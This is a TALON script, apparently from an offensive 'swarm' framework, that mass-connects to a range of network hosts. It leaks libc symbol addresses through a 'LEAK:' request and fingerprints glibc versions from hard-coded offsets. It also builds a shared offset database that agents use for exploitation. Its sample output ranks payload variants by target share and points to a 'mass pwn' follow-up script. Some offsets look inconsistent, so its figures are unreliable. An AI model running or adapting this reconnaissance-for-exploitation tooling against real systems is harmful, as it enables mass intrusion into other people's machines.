// TALON Swarm Distributed Libc Detection and Aggregation Example
// Demonstrates swarm-based reconnaissance for libc version detection across networks
//
// Usage:
//   talon swarm run swarm_libc_leak.talon --agents-from inventory.ini --filter-cap binary_analysis
//
// This example demonstrates:
// - Distributed libc version detection across multiple targets
// - Automatic libc database building from network reconnaissance
// - Symbol offset aggregation and verification
// - Cross-referencing discovered libc versions
// - Building a custom libc database for target network
//
// Swarm Primitives Used:
// - swarm.sync_registry(): Share discovered libc offsets across agents
// - swarm.aggregate_intel(): Merge libc database entries from all agents
// - mass_connect(): Concurrent connection to multiple targets
// - swarm.cross_reference(): Verify libc versions across different targets
// - swarm.build_database(): Construct unified libc database from discoveries

// Configuration
let target_port = 9999
let max_concurrent = 50
let timeout_ms = 5000
let leak_attempts = 3

print "TALON Swarm Distributed Libc Detection"
print "======================================="
print "Target port: " + target_port
print "Max concurrent: " + max_concurrent
print ""

// Target network (from scan results or predefined)
let targets = [
    "192.168.1.10",
    "192.168.1.11",
    "192.168.1.12",
    "192.168.1.13",
    "192.168.1.14",
    "192.168.1.15",
    "192.168.1.16",
    "192.168.1.17",
    "192.168.1.18",
    "192.168.1.19",
    "192.168.1.20"
]

print "Targets to analyze: " + len(targets)
print ""

// Libc database storage (shared across swarm via swarm.sync_registry())
let libc_database = {}
let symbol_offsets = {}
let unique_libc_count = 0

// Agent identification
let agent_id = get_agent_id()
print "Agent " + agent_id + " starting libc detection..."
print ""

// Connect to all targets
let connections = mass_connect(
    targets,
    target_port,
    max_concurrent,
    timeout_ms,
    0  // No rate limiting for this operation
)

print "Connection phase complete"
print "  Successful: " + count_successful(connections)
print "  Failed: " + count_failed(connections)
print ""

// Process each successful connection
for conn_result in connections
    if conn_result.success
        let target_ip = conn_result.target
        let conn_id = conn_result.connection_id
        
        print "Analyzing target: " + target_ip
        
        try
            // Attempt to leak multiple symbols for libc fingerprinting
            let leaked_symbols = leak_multiple_symbols(conn_id, leak_attempts)
            
            if len(leaked_symbols) > 0
                print "  Leaked " + len(leaked_symbols) + " symbols"
                
                // Fingerprint libc version based on leaked symbols
                let libc_info = fingerprint_libc(leaked_symbols, target_ip)
                
                if libc_info.version != "unknown"
                    print "  Detected: " + libc_info.version
                    print "  Base address: 0x" + hex(libc_info.base)
                    print "  Build ID: " + libc_info.build_id
                    
                    // Add to database
                    let db_key = libc_info.build_id
                    
                    if libc_database[db_key] == null
                        // New libc version discovered
                        unique_libc_count = unique_libc_count + 1
                        print "  [NEW] Unique libc version #" + unique_libc_count
                        
                        libc_database[db_key] = {
                            "version": libc_info.version,
                            "build_id": libc_info.build_id,
                            "symbols": libc_info.symbols,
                            "targets": [target_ip],
                            "first_seen": current_timestamp(),
                            "agent_discovered": agent_id
                        }
                        
                        // Synchronize with other agents
                        swarm_sync_libc_discovery(db_key, libc_database[db_key])
                    else
                        // Known libc, add target to list
                        let existing = libc_database[db_key]
                        existing.targets = [...existing.targets, target_ip]
                        libc_database[db_key] = existing
                        print "  [KNOWN] Matches existing entry"
                    end
                    
                    // Store symbol offsets for cross-referencing
                    for symbol_name, offset in libc_info.symbols
                        if symbol_offsets[symbol_name] == null
                            symbol_offsets[symbol_name] = {}
                        end
                        
                        symbol_offsets[symbol_name][libc_info.version] = offset
                    end
                else
                    print "  [FAILED] Could not fingerprint libc"
                end
            else
                print "  [FAILED] No symbols leaked"
            end
            
            // Close connection
            close conn_id
            
        catch error
            print "  [ERROR] " + error
        end
    end
end

print ""
print "Libc Detection Complete"
print "  Unique libc versions: " + unique_libc_count
print "  Total targets analyzed: " + count_successful(connections)
print ""

// Display discovered libc database
print "Discovered Libc Database:"
print "========================="
for build_id, info in libc_database
    print ""
    print "Build ID: " + build_id
    print "  Version: " + info.version
    print "  Targets: " + len(info.targets) + " (" + join(info.targets, ", ") + ")"
    print "  Discovered by: " + info.agent_discovered
    print "  First seen: " + info.first_seen
    print "  Symbols:"
    
    for symbol_name, offset in info.symbols
        print "    " + symbol_name + ": 0x" + hex(offset)
    end
end

print ""
print "Symbol Offset Cross-Reference:"
print "==============================="
for symbol_name, versions in symbol_offsets
    print ""
    print symbol_name + ":"
    for version, offset in versions
        print "  " + version + ": 0x" + hex(offset)
    end
end

// Return results for swarm aggregation
return {
    "agent_id": agent_id,
    "targets_analyzed": count_successful(connections),
    "unique_libc_versions": unique_libc_count,
    "libc_database": libc_database,
    "symbol_offsets": symbol_offsets
}

// Helper Functions

// Leak multiple symbols from target
define leak_multiple_symbols(conn_id, max_attempts)
    let symbols = {}
    
    // Common symbols to leak for fingerprinting
    let symbol_list = ["system", "execve", "puts", "printf", "malloc", "free", "read", "write"]
    
    for symbol_name in symbol_list
        try
            // Send leak request for specific symbol
            send conn_id, "LEAK:" + symbol_name + "\n"
            let response = recv conn_id, 8, 2000
            
            if len(response) == 8
                let addr = u64(response)
                symbols[symbol_name] = addr
                print "    Leaked " + symbol_name + ": 0x" + hex(addr)
            end
        catch error
            // Continue to next symbol
        end
    end
    
    return symbols
end

// Fingerprint libc version based on leaked symbols
define fingerprint_libc(leaked_symbols, target_ip)
    // Calculate base address from known offsets
    // This is simplified - production would use comprehensive libc database
    
    let libc_info = {
        "version": "unknown",
        "build_id": "unknown",
        "base": 0x0,
        "symbols": {}
    }
    
    // Check if we have system() symbol
    if leaked_symbols["system"] != null
        let system_addr = leaked_symbols["system"]
        
        // Try to match against known libc versions
        // libc-2.31: system offset = 0x50d60
        // libc-2.27: system offset = 0x4f4e0
        // libc-2.35: system offset = 0x52290
        
        let potential_base_2_31 = system_addr - 0x50d60
        let potential_base_2_27 = system_addr - 0x4f4e0
        let potential_base_2_35 = system_addr - 0x52290
        
        // Cross-check with other symbols
        let matched_version = cross_check_version(
            leaked_symbols,
            potential_base_2_31,
            potential_base_2_27,
            potential_base_2_35
        )
        
        if matched_version == "2.31"
            libc_info.version = "libc-2.31"
            libc_info.build_id = "libc6_2.31-0ubuntu9.9"
            libc_info.base = potential_base_2_31
        else if matched_version == "2.27"
            libc_info.version = "libc-2.27"
            libc_info.build_id = "libc6_2.27-3ubuntu1.6"
            libc_info.base = potential_base_2_27
        else if matched_version == "2.35"
            libc_info.version = "libc-2.35"
            libc_info.build_id = "libc6_2.35-0ubuntu3.4"
            libc_info.base = potential_base_2_35
        else
            // Unknown version - use generic fingerprint
            libc_info.version = "libc-unknown"
            libc_info.build_id = "build_" + hex(system_addr)
            libc_info.base = potential_base_2_31  // Best guess
        end
        
        // Calculate all symbol offsets
        for symbol_name, addr in leaked_symbols
            libc_info.symbols[symbol_name] = addr - libc_info.base
        end
    end
    
    return libc_info
end

// Cross-check libc version using multiple symbols
define cross_check_version(leaked_symbols, base_2_31, base_2_27, base_2_35)
    let score_2_31 = 0
    let score_2_27 = 0
    let score_2_35 = 0
    
    // Known offsets for common symbols
    let offsets_2_31 = {
        "system": 0x50d60,
        "puts": 0x875a0,
        "printf": 0x64f70,
        "malloc": 0x97070
    }
    
    let offsets_2_27 = {
        "system": 0x4f4e0,
        "puts": 0x809c0,
        "printf": 0x64e80,
        "malloc": 0x97070
    }
    
    let offsets_2_35 = {
        "system": 0x52290,
        "puts": 0x80ed0,
        "printf": 0x61c90,
        "malloc": 0x9a1f0
    }
    
    // Score each version based on matching offsets
    for symbol_name, addr in leaked_symbols
        if offsets_2_31[symbol_name] != null
            if addr == base_2_31 + offsets_2_31[symbol_name]
                score_2_31 = score_2_31 + 1
            end
        end
        
        if offsets_2_27[symbol_name] != null
            if addr == base_2_27 + offsets_2_27[symbol_name]
                score_2_27 = score_2_27 + 1
            end
        end
        
        if offsets_2_35[symbol_name] != null
            if addr == base_2_35 + offsets_2_35[symbol_name]
                score_2_35 = score_2_35 + 1
            end
        end
    end
    
    // Return version with highest score
    if score_2_31 > score_2_27 && score_2_31 > score_2_35
        return "2.31"
    else if score_2_27 > score_2_35
        return "2.27"
    else if score_2_35 > 0
        return "2.35"
    else
        return "unknown"
    end
end

// Synchronize libc discovery with swarm
define swarm_sync_libc_discovery(build_id, libc_info)
    // In production, this uses swarm.sync_registry() to share with all agents
    // Other agents can use this information for their exploitation attempts
    // swarm.sync_registry("libc_database", build_id, libc_info)
    return true
end

// Helper function to count successful connections
define count_successful(results)
    let count = 0
    for result in results
        if result.success
            count = count + 1
        end
    end
    return count
end

define count_failed(results)
    let count = 0
    for result in results
        if !result.success
            count = count + 1
        end
    end
    return count
end

// Get current timestamp
define current_timestamp()
    return "2026-02-06T18:59:00Z"
end

// Get agent ID
define get_agent_id()
    return "agent-libc-01"
end

// Join array elements with separator
define join(array, separator)
    let result = ""
    let first = true
    for item in array
        if !first
            result = result + separator
        end
        result = result + item
        first = false
    end
    return result
end

// Expected output when run via swarm controller:
//
// TALON Swarm Distributed Libc Detection Results
// ===============================================
// Scan Duration: 12.3 seconds
// Agents Deployed: 8
// Targets Analyzed: 96 (12 per agent)
//
// Unique Libc Versions Discovered: 5
//
// Libc Database Summary:
// ======================
//
// 1. libc6_2.31-0ubuntu9.9 (Ubuntu 20.04 LTS)
//    Targets: 45 instances
//    Symbols: system=0x50d60, execve=0x50db0, puts=0x875a0, printf=0x64f70
//    First discovered: agent-libc-02 @ 2026-02-06T18:59:00Z
//
// 2. libc6_2.27-3ubuntu1.6 (Ubuntu 18.04 LTS)
//    Targets: 23 instances
//    Symbols: system=0x4f4e0, execve=0x4f530, puts=0x809c0, printf=0x64e80
//    First discovered: agent-libc-01 @ 2026-02-06T18:59:01Z
//
// 3. libc6_2.35-0ubuntu3.4 (Ubuntu 22.04 LTS)
//    Targets: 18 instances
//    Symbols: system=0x52290, execve=0x522e0, puts=0x80ed0, printf=0x61c90
//    First discovered: agent-libc-05 @ 2026-02-06T18:59:02Z
//
// 4. libc6_2.33-0ubuntu5 (Ubuntu 21.04)
//    Targets: 7 instances
//    Symbols: system=0x52050, execve=0x520a0, puts=0x80ed0, printf=0x61e70
//    First discovered: agent-libc-03 @ 2026-02-06T18:59:03Z
//
// 5. musl-1.2.3 (Alpine Linux)
//    Targets: 3 instances
//    Symbols: system=0x45a20, execve=0x45a70, puts=0x78b40, printf=0x5f8d0
//    First discovered: agent-libc-07 @ 2026-02-06T18:59:04Z
//
// Symbol Offset Analysis:
// =======================
// system():
//   libc-2.31: 0x50d60
//   libc-2.27: 0x4f4e0
//   libc-2.35: 0x52290
//   libc-2.33: 0x52050
//   musl-1.2.3: 0x45a20
//
// execve():
//   libc-2.31: 0x50db0
//   libc-2.27: 0x4f530
//   libc-2.35: 0x522e0
//   libc-2.33: 0x520a0
//   musl-1.2.3: 0x45a70
//
// Exploitation Recommendations:
// ==============================
// - 47% of targets use libc-2.31 (Ubuntu 20.04) - prioritize this payload variant
// - 24% use libc-2.27 (Ubuntu 18.04) - second priority
// - 19% use libc-2.35 (Ubuntu 22.04) - newer, may have additional protections
// - 3 Alpine Linux targets (musl) - require specialized payload
//
// Database Export:
// ================
// Custom libc database saved to: ~/.talon/libc_cache_network.json
// Ready for import: talon libc-db import libc_cache_network.json
//
// Next Steps:
// ===========
// Use discovered libc versions for targeted exploitation:
//   talon swarm run swarm_mass_pwn.talon --libc-db libc_cache_network.json
